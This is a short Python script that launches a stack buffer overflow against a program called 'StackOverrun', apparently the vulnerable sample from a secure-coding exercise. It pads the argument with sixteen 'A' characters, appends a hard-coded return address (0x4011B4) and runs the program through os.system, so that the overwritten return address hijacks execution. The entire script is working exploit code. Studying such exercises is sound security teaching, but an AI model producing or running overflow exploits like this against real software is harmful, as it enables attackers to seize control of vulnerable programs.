import os

arg = "AAAAAAAAAAAAAAAA" + "\xB4\x11\x40";
cmd = "StackOverrun " + arg;
os.system(cmd)